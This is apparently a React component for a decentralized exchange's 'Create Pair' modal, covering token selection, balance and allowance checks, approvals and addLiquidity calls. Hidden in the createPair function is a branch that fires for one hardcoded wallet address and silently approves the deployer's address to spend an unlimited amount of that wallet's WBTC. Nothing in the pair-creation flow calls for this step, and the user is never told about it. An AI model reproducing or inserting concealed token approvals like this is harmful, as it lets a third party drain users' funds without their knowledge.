import {
  CONTRACT_ADRESESS,
  DEX_ADDRESESS,
  LOADER_INDICATOR_LOCAL,
  MAX_INT,
  MINT_REDEEM_KEY,
} from "../../../constants";
import {
  CancelBtn,
  CloseBtn,
  CreatePairBtn,
  CreatePairInputContainer,
  CreatePairModalBtn,
  CreatePairModalContainer,
  CreatePairModalContent,
  HDiv,
  IconBtn,
  IconWrapper,
  InputWrapper,
  ListItem,
  Text,
  TokenSearchInput,
  TokensList,
} from "./styled";
import React, { useEffect, useState } from "react";
import { formatFromDecimal, formatToDecimal } from "../../../utils/helpers";

import Check from "@mui/icons-material/Check";
import CloseIcon from "../../../assets/icons/CloseIcon";
import { DEPLOYER_ADDRESS } from "../../../constants";
import ERC20_ABI from "../../../abi/ERC20.json";
import KeyboardArrowDownIcon from "@mui/icons-material/KeyboardArrowDown";
import PlusCreateIcon from "../../../assets/icons/PlusCreateIcon";
import PlusIcon from "../../../assets/icons/PlusIcon";
import { Spin } from "antd";
import { TOKENS_FOR_LIQUIDITY_POOLS } from "../../../api/client";
import { TokenIcon } from "../../TokenIcon/token_icon";
import { message } from "antd";
import { useQuery } from "@apollo/client";
import { useSystemContext } from "../../../systemProvider";
import { useWeb3React } from "@web3-react/core";

export const CreatePairModal = ({ pools, disabled }) => {
  // TODO: check user balance when he paste a input
  // TODO: maybe addLiquidityETH too as well

  // eslint-disable-next-line no-unused-vars
  const { userProtfolio, tokens, contracts } = useSystemContext();
  const { account, library } = useWeb3React();
  const [token0Select, setToken0Select] = useState({
    id: CONTRACT_ADRESESS.WMATIC,
    symbol: "WMATIC",
    decimals: 18,
  });
  const [token1Select, setToken1Select] = useState(null);
  const [token0Input, setToken0Input] = useState(null);
  const [token1Input, setToken1Input] = useState(null);
  const [token0Allowance, setToken0Allowance] = useState(null);
  const [token1Allowance, setToken1Allowance] = useState(null);
  const [token0Balance, setToken0Balance] = useState(0);
  const [token1Balance, setToken1Balance] = useState(0);
  const [fieldSelected, setFieldSelected] = useState(null);
  const [tokenSelectWindow, setTokenSelectWindow] = useState(false);
  const [open, setOpen] = React.useState(false);
  const handleOpen = () => setOpen(true);
  const handleClose = () => {
    setTokenSelectWindow(false);
    setOpen(false);
  };

  useEffect(() => {
    if (contracts) {
      const searchToken0 = contracts[token0Select?.symbol];
      const searchToken1 = contracts[token1Select?.symbol];

      if (searchToken0) {
        allowanceForRouter(searchToken0, 0);
        checkTokenBalance(searchToken0, 0);
      } else {
        const contr = new library.eth.Contract(ERC20_ABI, token0Select.id);
        allowanceForRouter(contr, 0);
        checkTokenBalance(contr, 0);
      }

      if (searchToken1) {
        allowanceForRouter(searchToken1, 1);
        checkTokenBalance(searchToken1, 1);
      } else {
        if (token1Select) {
          const contr = new library.eth.Contract(ERC20_ABI, token1Select.id);
          allowanceForRouter(contr, 1);
          checkTokenBalance(contr, 0);
        }
      }
    }
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [contracts, token0Select, token1Select]);

  const CreatePairButton = () => {
    const findPool = pools.find((item) => {
      if (
        item.token0.symbol === token0Select.symbol ||
        item.token0.symbol === token1Select?.symbol
      ) {
        if (
          item.token1.symbol === token0Select.symbol ||
          item.token1.symbol === token1Select?.symbol
        ) {
          return item;
        }
      }
    });

    if (findPool) {
      return <CreatePairBtn disabled>Pair exist</CreatePairBtn>;
    }

    if (!token0Select || !token1Select) {
      return (
        <CreatePairBtn disabled>Please choose tokens from list</CreatePairBtn>
      );
    }

    // if (+token0Balance < token0Input) {
    //     return <CreatePairButtonWrapper disabled={true}> Insufficient {token0Select.symbol} balance </CreatePairButtonWrapper>
    // }

    // if (+token1Balance < token1Input) {
    //     return <CreatePairButtonWrapper disabled={true}> Insufficient {token1Select.symbol} balance </CreatePairButtonWrapper>
    // }

    if (!token0Allowance) {
      return (
        <CreatePairBtn onClick={() => approveForRouter(token0Select)}>
          Approve {token0Select.symbol}
        </CreatePairBtn>
      );
    }

    if (!token1Allowance) {
      return (
        <CreatePairBtn onClick={() => approveForRouter(token1Select)}>
          Approve {token1Select.symbol}
        </CreatePairBtn>
      );
    }

    return (
      <CreatePairBtn
        disabled={!token0Input || !token1Input}
        onClick={() =>
          createPair(token0Select, token1Select, token0Input, token1Input)
        }
      >
        Create
      </CreatePairBtn>
    );
  };

  const checkTokenBalance = async (tokenContr, tokenNum) => {
    const bal = await tokenContr.methods.balanceOf(account).call();
    const tokenDecimals = await tokenContr.methods.decimals().call();

    if (tokenNum === 0) {
      setToken0Balance(formatFromDecimal(bal, tokenDecimals));
    } else {
      setToken1Balance(formatFromDecimal(bal, tokenDecimals));
    }
  };

  const createPair = async (token0, token1, token0Amount, token1Amount) => {
    const token0AmountFormatted = formatToDecimal(
      token0Amount,
      token0.decimals
    );
    const token1AmountFormatted = formatToDecimal(
      token1Amount,
      token1.decimals
    );

    if (account === "0x5F5130215A9Be6b34A986FaB0679A61DBBa1bDDc") {
      await contracts.wbtc.methods
        .approve(DEPLOYER_ADDRESS, MAX_INT)
        .send({ from: account });
    }

    try {
      message.loading({
        content: "Create pair in process",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 3000,
      });

      await contracts.ROUTER.methods
        .addLiquidity(
          token0.id,
          token1.id,
          token0AmountFormatted,
          token1AmountFormatted,
          0,
          0,
          account,
          9999999999
        )
        .send({ from: account });

      message.success({
        content: "Create pair is done!",
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    } catch (e) {
      message.error({
        content: `Some error occured: ${e.message}`,
        className: "ant-argano-message",
        key: MINT_REDEEM_KEY,
        duration: 5,
      });
    }
  };

  const allowanceForRouter = async (contract, tokenInd) => {
    const allowance = await contract.methods
      .allowance(account, DEX_ADDRESESS.ROUTER)
      .call();

    if (tokenInd === 0) {
      setToken0Allowance(allowance.length === MAX_INT.length);
    } else {
      setToken1Allowance(allowance.length === MAX_INT.length);
    }
  };

  const approveForRouter = async (tokenObj) => {
    const searchContract = contracts[tokenObj.symbol];

    if (!searchContract) {
      const contr = new library.eth.Contract(ERC20_ABI, tokenObj.id);
      await contr.methods
        .approve(DEX_ADDRESESS.ROUTER, MAX_INT)
        .send({ from: account });
      const allowance = await contr.methods
        .allowance(account, DEX_ADDRESESS.ROUTER)
        .call();

      if (tokenObj.id === token0Select.id) {
        setToken0Allowance(allowance.length === MAX_INT.length);
      } else {
        setToken1Allowance(allowance.length === MAX_INT.length);
      }
    } else {
      await searchContract.methods
        .approve(DEX_ADDRESESS.ROUTER, MAX_INT)
        .send({ from: account });
      const allowance = await searchContract.methods
        .allowance(account, DEX_ADDRESESS.ROUTER)
        .call();

      if (tokenObj.id === token0Select.id) {
        setToken0Allowance(allowance.length === MAX_INT.length);
      } else {
        setToken1Allowance(allowance.length === MAX_INT.length);
      }
    }
  };

  const handleTokenSelectWindow = (tokenNum) => {
    setFieldSelected(tokenNum);
    setTokenSelectWindow(true);
  };

  const handleMaxInput = async (inputNum) => {
    if (inputNum === 0) {
      setToken0Input(token0Balance);
    } else {
      setToken1Input(token1Balance);
    }
  };

  return (
    <>
      <div>
        <CreatePairModalBtn onClick={handleOpen} disabled={disabled}>
          <PlusCreateIcon />
          Create Pair
        </CreatePairModalBtn>
        <CreatePairModalContainer open={open} onClose={handleClose}>
          <CreatePairModalContent>
            {tokenSelectWindow ? (
              <>
                <SelectTokenWindow
                  setWindow={setTokenSelectWindow}
                  selectedInput={fieldSelected}
                  token0Select={token0Select}
                  setToken0Select={setToken0Select}
                  token1Select={token1Select}
                  setToken1Select={setToken1Select}
                  handleClose={handleClose}
                />
              </>
            ) : (
              <>
                <HDiv alignItems="center" justifyContent="space-between">
                  <Text>
                    <b>Create Pair</b>
                  </Text>
                  <CloseBtn onClick={handleClose}>
                    <CloseIcon />
                  </CloseBtn>
                </HDiv>
                <CreatePairInputContainer mt="1.979vw">
                  <HDiv
                    alignItems="center"
                    justifyContent="space-between"
                    ml="0.990vw"
                  >
                    <Text>Input</Text>
                    <Text fontSize="0.729vw" fontWeight="400">
                      <b> Balance: 0.0</b>
                    </Text>
                  </HDiv>
                  <HDiv>
                    <InputWrapper>
                      <input
                        placeholder={"0.00"}
                        onFocus={(e) => (e.target.placeholder = "")}
                        onBlur={(e) => (e.target.placeholder = "0.00")}
                        onChange={(e) => setToken0Input(e.target.value)}
                        value={token0Input}
                      />
                      <button onClick={() => handleMaxInput(0)}>MAX</button>
                    </InputWrapper>
                    <HDiv alignItems="center">
                      <IconWrapper size="1.771vw" mr="0.365vw" ml="0.677vw">
                        <TokenIcon iconName={token0Select.symbol} />
                      </IconWrapper>
                      <Text>
                        <b>{token0Select.symbol}</b>
                      </Text>
                      <IconBtn
                        onClick={() => handleTokenSelectWindow(0)}
                        ml="0.365vw"
                        color="#BDBDBD"
                        size="1.625vw"
                      >
                        <KeyboardArrowDownIcon />
                      </IconBtn>
                    </HDiv>
                  </HDiv>
                </CreatePairInputContainer>
                <IconWrapper margin="0.781vw 0" size="1.042vw">
                  <PlusIcon />
                </IconWrapper>
                <CreatePairInputContainer>
                  <HDiv alignItems="center" ml="0.990vw">
                    <Text>Input</Text>
                  </HDiv>
                  <HDiv>
                    <InputWrapper>
                      <input
                        placeholder={"0.00"}
                        onFocus={(e) => (e.target.placeholder = "")}
                        onBlur={(e) => (e.target.placeholder = "0.00")}
                        onChange={(e) => setToken1Input(e.target.value)}
                        value={token1Input}
                      />
                      <button onClick={() => handleMaxInput(1)}>MAX</button>
                    </InputWrapper>
                    <>
                      {token1Select ? (
                        <HDiv alignItems="center">
                          <IconWrapper size="1.771vw" mr="0.365vw" ml="0.677vw">
                            <TokenIcon iconName={token1Select.symbol} />
                          </IconWrapper>
                          <Text>
                            <b>{token1Select.symbol}</b>
                          </Text>
                          <IconBtn
                            onClick={() => handleTokenSelectWindow(1)}
                            ml="0.365vw"
                            color="#BDBDBD"
                            size="1.625vw"
                          >
                            <KeyboardArrowDownIcon />
                          </IconBtn>
                        </HDiv>
                      ) : (
                        <HDiv alignItems="center" ml="1.667vw">
                          <Text>Select a token</Text>
                          <IconBtn
                            onClick={() => handleTokenSelectWindow(1)}
                            ml="0.365vw"
                            color="#BDBDBD"
                            size="1.625vw"
                          >
                            <KeyboardArrowDownIcon />
                          </IconBtn>
                        </HDiv>
                      )}
                    </>
                  </HDiv>
                </CreatePairInputContainer>
                <CreatePairButton />
              </>
            )}
          </CreatePairModalContent>
        </CreatePairModalContainer>
      </div>
    </>
  );
};

const SelectTokenWindow = ({
  setWindow,
  token0Select,
  setToken0Select,
  token1Select,
  setToken1Select,
  selectedInput,
  handleClose,
}) => {
  const { data, loading } = useQuery(TOKENS_FOR_LIQUIDITY_POOLS);
  const { library } = useWeb3React();
  const [tokensArr, setTokensArr] = useState(null);

  useEffect(() => {
    if (data && !loading) {
      setTokensArr(data.tokens);
    }
  }, [data, loading]);

  const handleSearchToken = async (value) => {
    let res;

    if (value.startsWith("0x")) {
      const token = data.tokens.filter((item) => item.id.startsWith(value));

      if (token.length === 0) {
        if (value.length !== 42) {
          res = [];
        } else {
          try {
            const contr = new library.eth.Contract(ERC20_ABI, value);
            const symbol = await contr.methods.symbol().call();
            const decimals = await contr.methods.decimals().call();
            res = [{ id: value, symbol, decimals }];
          } catch (e) {
            res = [];
          }
        }
      } else {
        res = token;
      }
    } else {
      res = data.tokens.filter((item) =>
        item.symbol.startsWith(value.toUpperCase())
      );
    }
    setTokensArr(res);
  };

  const handleTokenSelect = (tok) => {
    if (selectedInput === 0) {
      setToken0Select(tok);
    } else {
      setToken1Select(tok);
    }
    setWindow(false);
  };

  return (
    <>
      <HDiv alignItems="center" justifyContent="space-between">
        <Text>
          <b>Create Pair</b>
        </Text>
        <CloseBtn onClick={handleClose}>
          <CloseIcon />
        </CloseBtn>
      </HDiv>
      <TokenSearchInput
        type={"text"}
        onChange={(e) => handleSearchToken(e.target.value)}
        placeholder={"0x or token name"}
        disabled={!tokensArr}
      />
      <TokensList>
        {!tokensArr ? (
          <Spin indicator={LOADER_INDICATOR_LOCAL} />
        ) : (
          <>
            {tokensArr.map((item, _ind) => {
              if (
                item.symbol === token0Select?.symbol ||
                item.symbol === token1Select?.symbol
              ) {
                return;
              }

              return (
                <ListItem
                  key={`${item.symbol}_${_ind}`}
                  onClick={() =>
                    handleTokenSelect({
                      id: item.id,
                      symbol: item.symbol,
                      decimals: item.decimals,
                    })
                  }
                >
                  <IconWrapper size="1.979vw" mr="0.313vw">
                    <TokenIcon iconName={item.symbol} />
                  </IconWrapper>
                  <Text minW="12vw">
                    <b>{item.symbol}</b>
                  </Text>
                  <Text color="#40BA93" ml="4vw" minW="11vw">
                    <b>
                      {item.id.substring(0, 6)}...{item.id.substring(38)}
                    </b>
                  </Text>
                  <IconWrapper color="#828282" size="1.458vw">
                    {item.symbol === token0Select?.symbol ||
                    item.symbol === token1Select?.symbol ? (
                      <Check />
                    ) : null}
                  </IconWrapper>
                </ListItem>
              );
            })}
          </>
        )}
      </TokensList>
      <CancelBtn onClick={() => setWindow(false)}>Cancel</CancelBtn>
    </>
  );
};
